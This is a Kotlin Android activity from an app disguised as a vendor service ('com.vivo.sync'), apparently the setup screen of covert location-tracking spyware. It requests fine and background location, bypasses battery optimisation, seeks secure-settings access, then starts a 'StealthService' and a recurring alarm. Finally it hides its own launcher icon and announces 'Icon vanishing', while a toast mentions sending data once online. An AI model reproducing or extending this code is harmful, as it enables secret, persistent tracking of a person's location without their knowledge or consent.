package com.vivo.sync

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast

class MainActivity : Activity() {
    
    private val LOCATION_REQUEST_CODE = 100
    private val BACKGROUND_LOCATION_REQUEST_CODE = 101
    private val NOTIFICATION_REQUEST_CODE = 102
    private val SETUP_REQUEST_CODE = 200

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkAllPermissions()
    }

    private fun checkAllPermissions() {
        // Step 1: Location permission
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ), LOCATION_REQUEST_CODE)
            return
        }

        // Step 2: Background location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), BACKGROUND_LOCATION_REQUEST_CODE)
            return
        }

        // Step 3: Battery optimization bypass
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
            } catch (e: Exception) {}
        }

        // Step 4: Notification permission (Android 13+ — needed for pairing code input)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), NOTIFICATION_REQUEST_CODE)
            return
        }

        // Step 5: WRITE_SECURE_SETTINGS — launch embedded Setup if missing
        val hasSecureSettings = checkCallingOrSelfPermission("android.permission.WRITE_SECURE_SETTINGS") == PackageManager.PERMISSION_GRANTED
        if (!hasSecureSettings) {
            startActivityForResult(Intent(this, SetupActivity::class.java), SETUP_REQUEST_CODE)
            return
        }

        // Step 5: Internet check (warning only, don't block)
        if (!isNetworkAvailable()) {
            Toast.makeText(this, "⚠ No internet. Will send when connected.", Toast.LENGTH_LONG).show()
        }

        // All checks passed
        startStealthMode()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SETUP_REQUEST_CODE) {
            checkAllPermissions()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            LOCATION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    checkAllPermissions()
                } else {
                    Toast.makeText(this, "⚠ Location permission required.", Toast.LENGTH_LONG).show()
                    finish()
                }
            }
            BACKGROUND_LOCATION_REQUEST_CODE -> {
                checkAllPermissions()
            }
            NOTIFICATION_REQUEST_CODE -> {
                checkAllPermissions()
            }
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return false
            val capabilities = cm.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) { true }
    }

    private fun startStealthMode() {
        try { startService(Intent(this, StealthService::class.java)) } catch(e: Exception) {}
        
        try {
            val alarm = getSystemService(android.app.AlarmManager::class.java)
            val pi = android.app.PendingIntent.getBroadcast(
                this, 0, Intent(this, StealthReceiver::class.java),
                android.app.PendingIntent.FLAG_IMMUTABLE
            )
            alarm?.setAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + Config.INTERVAL_MS, pi)
        } catch(e: Exception) {}
        
        Toast.makeText(this, "✅ KERNEL BRIDGED. All systems go. Icon vanishing.", Toast.LENGTH_LONG).show()
        
        Handler(Looper.getMainLooper()).postDelayed({
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            finish()
        }, 3000)
    }
}